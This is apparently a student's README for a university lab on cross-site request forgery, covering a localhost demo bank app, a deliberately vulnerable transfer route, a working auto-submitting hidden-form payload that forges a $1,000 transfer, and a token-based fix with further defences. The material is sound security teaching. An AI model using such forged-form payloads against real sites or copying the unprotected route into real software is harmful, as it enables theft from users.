# Web Server Security: Cross-Site Request Forgery (CSRF)

**Indian Institute of Information Technology Allahabad (IIITA)**  
Department of Information Technology  
Course: **Cyber Security (IT-30001)** | Autumn Semester 2026  
Instructor: **Dr. Soumyadev Maity**

---

## 📋 Table 3. Ownership Declaration

| Member Name | Roll Number | Category | Variant Implemented |
| :--- | :--- | :--- | :--- |
| **Samir Kumar** | **IIT2024274** | **Cross-Site Request Forgery (CSRF)** | **Variant 2: POST-based forged action (auto-submitting form)** |

*(Full group submission covers the other three categories: SQL Injection, OS Command Injection, and Cross-Site Scripting).*

---

## 🌟 Overview & Architecture

This lab demonstrates an end-to-end exploit and defense against **Cross-Site Request Forgery (CSRF)** using a dual-origin setup:

1. **Target Web Application (`http://localhost:3000`)**:
   - **Apex Vault Bank**: An online banking portal where authenticated users manage accounts and transfer money via `POST /transfer`.
   - Contains a live **Security Mode Toggle** to switch between **Vulnerable Mode** and **Mitigated Mode**.
2. **Attacker's Malicious Server (`http://localhost:4000`)**:
   - A simulated hostile website hosting a social-engineering phishing page (`/claim-prize`).
   - Contains a hidden, **auto-submitting HTML POST form** that targets `http://localhost:3000/transfer`.

```
+-----------------------------------------------------------------------------------+
|                               Victim's Web Browser                                |
|                                                                                   |
|  1. Alice logs in to Apex Vault Bank (localhost:3000)                             |
|     --> Receives ambient session cookie: apex_vault_sid                           |
|                                                                                   |
|  2. Alice clicks link / visits Attacker Page (localhost:4000/claim-prize)         |
|                                                                                   |
|  3. Hidden form auto-submits POST to http://localhost:3000/transfer:              |
|     - recipient = attacker_bob                                                    |
|     - amount = 1000                                                               |
|     - Cookie: apex_vault_sid (Sent automatically by browser!)                     |
|                                                                                   |
|  [VULNERABLE MODE]  --> Transfer succeeds without Alice's intent ($1,000 lost)    |
|  [MITIGATED MODE]   --> Blocked with HTTP 403 Forbidden (Missing Anti-CSRF Token) |
+-----------------------------------------------------------------------------------+
```

---

## 🚀 Quick Start Guide

### 1. Installation
Clone this repository and install dependencies:

```bash
cd "IIT2024274(CSRF)"
npm install
```

### 2. Start Both Web Servers
Run the single start command to boot up both the bank (Port 3000) and the attacker site (Port 4000):

```bash
npm start
```

* Output in terminal:
  ```text
  🏦 [Apex Vault Bank] Target Web Application running at: http://localhost:3000
  🦹 [Attacker Site] Malicious Web Server running at: http://localhost:4000
  🔗 Exploit URL: http://localhost:4000/claim-prize
  ```

### 3. Demo Credentials
| Username | Password | Role | Initial Balance | Account Number |
| :--- | :--- | :--- | :--- | :--- |
| `alice` | `password123` | Victim Customer | **$5,000.00** | `APEX-10029` |
| `attacker_bob` | `password123` | Attacker Beneficiary | **$150.00** | `APEX-88392` |
| `charlie` | `password123` | Regular User | **$1,200.00** | `APEX-44910` |

---

## 🔬 Table 2 Breakdown (Viva & Video Requirements)

### (a) Vulnerable Implementation
The vulnerability exists in the bank's transfer route (`server.js`), which processes state-changing operations relying solely on session cookie authentication without verifying user intent:

```javascript
// Vulnerable Code Path in server.js:
bankApp.post('/transfer', requireAuth, (req, res) => {
  const sender = req.session.username;
  const { recipient, amount } = req.body;

  // FLAW: No CSRF token verification!
  // Any cross-origin request will include the victim's session cookie automatically.
  const result = db.transferFunds(sender, recipient, amount);
  return res.redirect('/dashboard');
});
```

### (b) Working Exploit
The attacker hosts an external page on `http://localhost:4000/claim-prize` containing this auto-submitting POST form payload:

```html
<!-- Malicious Payload on http://localhost:4000/claim-prize -->
<form id="csrfPayloadForm" action="http://localhost:3000/transfer" method="POST">
  <input type="hidden" name="recipient" value="attacker_bob" />
  <input type="hidden" name="amount" value="1000" />
</form>

<script>
  // The moment Alice loads this page, the form executes automatically!
  document.getElementById('csrfPayloadForm').submit();
</script>
```

**Exploit Execution Steps:**
1. Open `http://localhost:3000` in your browser and sign in as **Alice**.
2. Notice Alice's initial balance is **$5,000.00**.
3. In another tab (or by clicking the red button in the app), navigate to:
   `http://localhost:4000/claim-prize`
4. The page counts down and auto-submits the form to `http://localhost:3000/transfer`.
5. Return to Alice's dashboard on `localhost:3000`:
   - Alice's balance has dropped from **$5,000.00** to **$4,000.00**.
   - Bob's balance increased by **$1,000.00**.
   - A new transaction flagged as `🚨 UNINTENDED FORGED TRANSFER (CSRF Exploit)` appears in the transaction history.

### (c) Root Cause
The web application accepted a state-changing `POST` request based entirely on **ambient browser credentials** (session cookies sent automatically with cross-site requests) without requiring any unpredictable, secret proof of user intent that only the legitimate application origin can supply.

### (d) Implemented Mitigation (Synchronizer Token Pattern)
We implemented the **Anti-CSRF Synchronizer Token Pattern**:
1. When Alice logs in, the server generates a cryptographically strong, random token and stores it in her session:
   ```javascript
   req.session.csrfToken = crypto.randomBytes(24).toString('hex');
   ```
2. Legitimate forms rendered on the site embed this token in a hidden field:
   ```html
   <input type="hidden" name="_csrf" value="<%= csrfToken %>" />
   ```
3. On incoming `POST /transfer` requests, the server validates the submitted token against `req.session.csrfToken`:
   ```javascript
   // Mitigated Code Path:
   if (currentMode === 'MITIGATED') {
     const sessionToken = req.session.csrfToken;
     const submittedToken = req.body._csrf;

     if (!submittedToken || submittedToken !== sessionToken) {
       return res.status(403).send("403 Forbidden: Invalid or missing CSRF token!");
     }
   }
   ```
4. **Verification:**
   - Click **"Switch to Mitigated Mode"** on the dashboard.
   - Re-visit `http://localhost:4000/claim-prize`.
   - The auto-submitting form triggers, but the server immediately rejects the request with **HTTP 403 Forbidden**.
   - Alice's balance remains intact!

---

## 📚 (e) Other Mitigations (Theory)

Beyond the Synchronizer Token Pattern, lecture slides discuss the following defensive techniques:

1. **SameSite Cookie Attribute (`SameSite=Strict` / `SameSite=Lax`):**
   - Cookies marked with `SameSite=Strict` are never sent in cross-site requests (even for top-level navigation links).
   - `SameSite=Lax` allows cookies on top-level safe GET navigations, but blocks them on cross-site state-changing POST requests, mitigating standard CSRF.
2. **Re-Authentication & Step-Up Verification:**
   - Requiring the user to re-enter their current password, provide a One-Time Password (OTP/2FA), or solve a CAPTCHA prior to executing sensitive transactions (like fund transfers or email changes). Because the attacker cannot guess or forge the OTP, the CSRF attempt is neutralized.
3. **Custom Request Headers & Preflighted CORS:**
   - Requiring API endpoints to process JSON payloads with custom headers (e.g., `X-Requested-With` or `X-CSRF-Token`). Browsers do not allow cross-origin HTML forms to set custom headers; attempting to send custom headers via JavaScript triggers a CORS preflight (`OPTIONS`) request, which the target server can reject.
4. **Avoiding State-Changing GET Requests:**
   - Following RFC 7231 / HTTP semantics by ensuring `GET` requests are strictly safe and idempotent (read-only). State modifications must never be permitted via `GET`, which prevents trivial CSRF via simple image tags (`<img src="...">`).

---

## 📁 Repository Structure

```
IIT2024274(CSRF)/
├── package.json          # Node.js dependencies (express, express-session, cookie-parser)
├── server.js             # Dual server: Apex Vault Bank (3000) & Attacker Site (4000)
├── db.js                 # Accounts, transactions, audit logs, and security mode state
├── views/
│   ├── login.html        # Authentication interface
│   ├── dashboard.html    # Bank dashboard & CSRF workbench
│   └── attacker.html     # Malicious phishing landing page with auto-submitting form
├── public/
│   ├── css/style.css     # Clean fintech styling, responsive cards, terminal console
│   └── js/main.js        # Dynamic polling, mode toggling, modal handlers
└── README.md             # This comprehensive assignment documentation
```
